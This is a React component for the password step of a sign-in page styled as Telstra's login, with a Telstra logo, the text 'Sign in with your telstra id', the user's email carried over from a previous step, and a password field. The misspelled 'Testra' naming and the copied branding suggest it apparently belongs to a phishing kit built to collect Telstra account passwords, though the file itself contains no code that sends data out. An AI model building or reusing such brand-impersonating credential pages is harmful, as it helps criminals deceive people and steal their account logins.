import Button from "../UI/Button";

import logo from "../../assets/telstra.PNG";
import TestraPasswordInput from "../UI/TestraPasswordInput";


const TestraPassword = ({ formData, handleInputChange, errors, handleNext, handleBlur, handleBack }) => {


  return (
    <div className="min-h-screen flex-1 bg-white flex items-center justify-center">

      <div className="flex fixed top-0 left-0 border-b shadow-xl border border-gray-300 w-full">          
        <div className="flex md:ml-24 ml-12 mt-2 py-2">
          <img src={logo} className="w-12 h-12" alt="company logo" />
        </div>
      </div>

      <div className="w-sm md:w-lg px-8 -mt-1">

        <div className="flex flex-col pb-12 mt-4">
          <h1 className="text-2xl font-semibold text-left">Sign in</h1>
          <p className="text-sm font-medium pt-4">Sign in with your telstra id</p>
        </div>

        <div className="flex justify-between">
        </div>

        <div className="flex flex-col align-start justify-start pb-6 pt-2">

          <p className="text-sm pt-4 mb-2">Back to previous for:</p>
          
          <p onClick={handleBack} className="text-sm font-semibold flex text-black text-center border rounded-sm border-gray-600 px-3 py-2">
            

              <svg fill="#5e06f7" className="w-5 h-5" viewBox="-128 0 512 512" xmlns="http://www.w3.org/2000/svg"><g id="SVGRepo_bgCarrier" strokeWidth="0"></g><g id="SVGRepo_tracerCarrier" strokeLinecap="round" strokeLinejoin="round"></g><g id="SVGRepo_iconCarrier"><path d="M31.7 239l136-136c9.4-9.4 24.6-9.4 33.9 0l22.6 22.6c9.4 9.4 9.4 24.6 0 33.9L127.9 256l96.4 96.4c9.4 9.4 9.4 24.6 0 33.9L201.7 409c-9.4 9.4-24.6 9.4-33.9 0l-136-136c-9.5-9.4-9.5-24.6-.1-34z"></path></g></svg>
             
              {formData.email}

          </p>
        </div>

        <TestraPasswordInput
          label="Password"
          name="password"
          value={formData.password}
          placeholder="Password"
          onChange={handleInputChange}
          error={errors.password}
          onBlur={handleBlur}
          className="border-2 placeholder:text-gray-600 text-black"
        />

        <div className="flex justify-end py-4">
          
            <Button
              onClick={handleNext}
              disabled={errors.email}
              className="bg-blue-500 px-10 py-3 text-sm rounded-2xl text-white hover:bg-blue-600 transition-colors w-full"
            >
              Next
            </Button>
        </div>

      </div>

    </div>
  );
};

export default TestraPassword;
